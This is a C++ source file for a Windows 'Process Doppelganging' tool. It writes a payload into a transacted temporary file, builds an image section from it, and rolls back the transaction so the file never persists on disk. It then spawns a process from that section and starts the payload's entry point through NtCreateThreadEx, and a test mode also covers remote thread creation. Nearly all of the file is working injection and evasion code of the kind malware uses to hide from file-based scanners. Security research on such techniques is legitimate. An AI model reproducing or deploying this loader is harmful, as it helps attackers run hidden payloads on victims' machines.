#include <Windows.h>
#include <KtmW32.h>

#include <iostream>
#include <stdio.h>

#include "ntddk.h"
#include "ntdll_undoc.h"
#include "util.h"

#include "pe_hdrs_helper.h"
#include "process_env.h"

#pragma comment(lib, "KtmW32.lib")
#pragma comment(lib, "Ntdll.lib")

#define PAGE_SIZE 0x1000
#define THREAD_TESTS
#define USE_NATIVE

HANDLE make_transacted_section(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
{
    DWORD options, isolationLvl, isolationFlags, timeout;
    options = isolationLvl = isolationFlags = timeout = 0;

    HANDLE hTransaction = CreateTransaction(nullptr, nullptr, options, isolationLvl, isolationFlags, timeout, nullptr);
    if (hTransaction == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create transaction!" << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    wchar_t dummy_name[MAX_PATH] = { 0 };
    wchar_t temp_path[MAX_PATH] = { 0 };
    DWORD size = GetTempPathW(MAX_PATH, temp_path);

    GetTempFileNameW(temp_path, L"TH", 0, dummy_name);
    HANDLE hTransactedFile = CreateFileTransactedW(dummy_name,
        GENERIC_WRITE | GENERIC_READ,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTransaction,
        NULL,
        NULL
    );
    if (hTransactedFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create transacted file: " << GetLastError() << std::endl;
        return INVALID_HANDLE_VALUE;
    }

    DWORD writtenLen = 0;
    if (!WriteFile(hTransactedFile, payladBuf, payloadSize, &writtenLen, NULL)) {
        std::cerr << "Failed writing payload! Error: " << GetLastError() << std::endl;
        return INVALID_HANDLE_VALUE;
    }

    HANDLE hSection = nullptr;
    NTSTATUS status = NtCreateSection(&hSection,
        SECTION_ALL_ACCESS,
        NULL,
        0,
        PAGE_READONLY,
        SEC_IMAGE,
        hTransactedFile
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "NtCreateSection failed: " << std::hex << status << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    CloseHandle(hTransactedFile);
    hTransactedFile = nullptr;

    if (RollbackTransaction(hTransaction) == FALSE) {
        std::cerr << "RollbackTransaction failed: " << std::hex << GetLastError() << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    CloseHandle(hTransaction);
    hTransaction = nullptr;

    return hSection;
}

HANDLE open_file(wchar_t* filePath)
{
#ifdef USE_NATIVE
    // convert to NT path
    std::wstring nt_path = L"\\??\\" + std::wstring(filePath);
    HANDLE hFile = INVALID_HANDLE_VALUE;

    UNICODE_STRING file_name = { 0 };
    RtlInitUnicodeString(&file_name, nt_path.c_str());

    std::wcout << "Opening file: " << file_name.Buffer << "\n";

    OBJECT_ATTRIBUTES attr = { 0 };
    InitializeObjectAttributes(&attr, &file_name, OBJ_CASE_INSENSITIVE, NULL, NULL);
    IO_STATUS_BLOCK status_block = { 0 };

    NTSTATUS stat = NtCreateFile(&hFile, FILE_GENERIC_READ, &attr, &status_block, 0,
        FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OPEN_IF, FILE_RANDOM_ACCESS | FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

    if (!NT_SUCCESS(stat)) {
        std::cout << "Failed to open, status: " << std::hex << stat << std::endl;
        return INVALID_HANDLE_VALUE;
    }
#else
    HANDLE hFile = CreateFileW(filePath,
        GENERIC_READ,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create transacted file: " << GetLastError() << std::endl;
        return INVALID_HANDLE_VALUE;
    }
#endif
    std::wcout << "[+] Opened file: " << filePath << "\n";
    return hFile;
}

HANDLE make_section_from_the_file(HANDLE hFile)
{
    HANDLE hSection = nullptr;
    NTSTATUS status = NtCreateSection(&hSection,
        SECTION_ALL_ACCESS,
        NULL,
        0,
        PAGE_READONLY,
        SEC_IMAGE,
        hFile
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "NtCreateSection failed: " << std::hex << status << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    return hSection;
}

PVOID map_buffer_into_process(HANDLE hProcess, HANDLE hSection)
{
    NTSTATUS status = STATUS_SUCCESS;
    SIZE_T viewSize = 0;
    PVOID sectionBaseAddress = 0;

    if ((status = NtMapViewOfSection(hSection, hProcess, &sectionBaseAddress, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_READONLY)) != STATUS_SUCCESS)
    {
        if (status == STATUS_IMAGE_NOT_AT_BASE) {
            std::cerr << "[WARNING] Image could not be mapped at its original base! If the payload has no relocations, it won't work!\n";
        }
        if (status == STATUS_IMAGE_MACHINE_TYPE_MISMATCH) {
            std::cerr << "[WARNING] Incompatibile bitness\n";
        }
        if (status == STATUS_INVALID_PARAMETER) {
            std::cerr << "[ERROR] NtMapViewOfSection failed, STATUS_INVALID_PARAMETER"<< std::endl;
            return NULL;
        }
        else {
            std::cerr << "[ERROR] NtMapViewOfSection failed, status: " << std::hex << status << std::endl;
            return NULL;
        }
    }
    std::cout << "Mapped Base:\t" << std::hex << (ULONG_PTR)sectionBaseAddress << "\n";
    return sectionBaseAddress;
}

HANDLE create_process_form_section(HANDLE hSection)
{
    HANDLE hProcess = nullptr;
    NTSTATUS status = NtCreateProcessEx(
        &hProcess, //ProcessHandle
        PROCESS_ALL_ACCESS, //DesiredAccess
        NULL, //ObjectAttributes
        NtCurrentProcess(), //ParentProcess
        0, //Flags
        hSection, //sectionHandle
        NULL, //DebugPort
        NULL, //ExceptionPort
        FALSE //InJob
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "NtCreateProcessEx failed! Status: " << std::hex << status << std::endl;
        if (status == STATUS_IMAGE_MACHINE_TYPE_MISMATCH) {
            std::cerr << "[!] The payload has mismatching bitness!" << std::endl;
        }
        return INVALID_HANDLE_VALUE;
    }
    return hProcess;
}

bool read_remote_peb(HANDLE hProcess, PEB &peb_copy)
{
    PROCESS_BASIC_INFORMATION pi = { 0 };

    DWORD ReturnLength = 0;
    NTSTATUS status = NtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pi,
        sizeof(PROCESS_BASIC_INFORMATION),
        &ReturnLength
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "NtQueryInformationProcess failed: " << std::hex << status << std::endl;
        return false;
    }

    if (!buffer_remote_peb(hProcess, pi, peb_copy)) {
        return false;
    }
    return true;
}

bool create_thread_test(wchar_t* targetPath)
{
#ifdef PROCESS_FROM_SECTION
    HANDLE hFile = open_file(targetPath);
    if (!hFile || hFile == INVALID_HANDLE_VALUE) return false;

    HANDLE hSec = make_section_from_the_file(hFile);
    NtClose(hFile); hFile = NULL;
    if (!hSec || hSec == INVALID_HANDLE_VALUE) return false;

    HANDLE hProcess = create_process_form_section(hSec);
    if (hProcess == INVALID_HANDLE_VALUE) return false;

#else
    PROCESS_INFORMATION pi = { 0 };
    
    STARTUPINFOW si = { 0 };
    si.cb = sizeof(STARTUPINFOW);

    if (!CreateProcessW(targetPath, targetPath, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi)) {
        return false;
    }
    HANDLE hProcess = pi.hProcess;
#endif

    size_t payloadSize = 0;
    BYTE* payladBuf = buffer_payload(targetPath, payloadSize);
    if (payladBuf == NULL) {
        std::cerr << "Cannot read payload!" << std::endl;
        return false;
    }
    DWORD payload_ep = get_entry_point_rva(payladBuf);
    NtUnmapViewOfSection(GetCurrentProcess(), payladBuf);

    PEB peb_copy = { 0 };
    if (!read_remote_peb(hProcess, peb_copy)) {
        std::cerr << "Failed reading remote PEB\n";
        return false;
    }
    ULONGLONG imageBase = (ULONGLONG)peb_copy.ImageBaseAddress;

    HANDLE hThread = NULL;
    
    ULONGLONG procEntry = payload_ep + imageBase;

    std::wcout << "ImageBase: " << std::hex << imageBase << "\n"
        << "EntryPoint: " << procEntry << std::endl;

#ifdef USE_NATIVE
    NTSTATUS status = NtCreateThreadEx(&hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        (LPTHREAD_START_ROUTINE)procEntry,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "NtCreateThreadEx failed: " << std::hex << status << std::endl;
        return false;
    }
#else
    DWORD threadId = 0;
    hThread = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)procEntry, 0, 0, &threadId);
    if (!hThread) {
        std::cerr << "CreateRemoteThread failed: " << std::hex << GetLastError() << std::endl;
        return false;
    }
    std::cout << "Created thread, ID: " << std::hex << threadId << std::endl;
#endif
    return true;
}


bool process_doppel(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
{
    HANDLE hSection = make_transacted_section(targetPath, payladBuf, payloadSize);
    if (!hSection || hSection == INVALID_HANDLE_VALUE) {
        return false;
    }
    HANDLE hProcess = create_process_form_section(hSection);

    PROCESS_BASIC_INFORMATION pi = { 0 };

    DWORD ReturnLength = 0;
    NTSTATUS status = NtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pi,
        sizeof(PROCESS_BASIC_INFORMATION),
        &ReturnLength
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "NtQueryInformationProcess failed: " << std::hex << status << std::endl;
        return false;
    }
    PEB peb_copy = { 0 };
    if (!buffer_remote_peb(hProcess, pi, peb_copy)) {
        return false;
    }
    ULONGLONG imageBase = (ULONGLONG) peb_copy.ImageBaseAddress;
#ifdef _DEBUG
    std::cout << "ImageBase address: " << (std::hex) << (ULONGLONG)imageBase << std::endl;
#endif
    DWORD payload_ep = get_entry_point_rva(payladBuf);
    ULONGLONG procEntry =  payload_ep + imageBase;

    if (!setup_process_parameters(hProcess, pi, targetPath)) {
        std::cerr << "Parameters setup failed" << std::endl;
        return false;
    }
    DWORD proc_id = GetProcessId(hProcess);
    std::cout << "[+] Process created! Pid = " << std::dec << proc_id << "\n";
#ifdef _DEBUG
    std::cerr << "EntryPoint at: " << (std::hex) << (ULONGLONG)procEntry << std::endl;
#endif
    HANDLE hThread = NULL;

    status = NtCreateThreadEx(&hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        (LPTHREAD_START_ROUTINE) procEntry,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL
    );
    if (!hThread) {
        std::cerr << "NtCreateThreadEx failed: " << std::hex << status << std::endl;
        return false;
    }

    return true;
}

int wmain(int argc, wchar_t *argv[])
{
#ifdef _WIN64
    const bool is32bit = false;
#else
    const bool is32bit = true;
#endif
    if (argc < 2) {
        std::cout << "Process Doppelganging (";
        if (is32bit) std::cout << "32bit";
        else std::cout << "64bit";
        std::cout << ")\n";
        std::cout << "params: <payload path> [*target path]\n" << std::endl;
        std::cout << "* - optional" << std::endl;
        system("pause");
        return 0;
    }
    if (init_ntdll_func() == false) {
        return -1;
    }
    wchar_t defaultTarget[MAX_PATH] = { 0 };
    get_calc_path(defaultTarget, MAX_PATH, is32bit);
    wchar_t *targetPath = defaultTarget;
    if (argc >= 3) {
        targetPath = argv[2];
    }
    wchar_t *payloadPath = argv[1];
    size_t payloadSize = 0;

#ifdef THREAD_TESTS
    bool is_ok = create_thread_test(payloadPath);
#else
    BYTE* payladBuf = buffer_payload(payloadPath, payloadSize);
    if (payladBuf == NULL) {
        std::cerr << "Cannot read payload!" << std::endl;
        return -1;
    }
    bool is_ok = process_doppel(targetPath, payladBuf, (DWORD) payloadSize);

    free_buffer(payladBuf, payloadSize);
#endif
    if (is_ok) {
        std::cerr << "[+] Done!" << std::endl;
    } else {
        std::cerr << "[-] Failed!" << std::endl;
#ifdef _DEBUG
        system("pause");
#endif
        return -1;
    }
#ifdef _DEBUG
    system("pause");
#endif
    return 0;
}
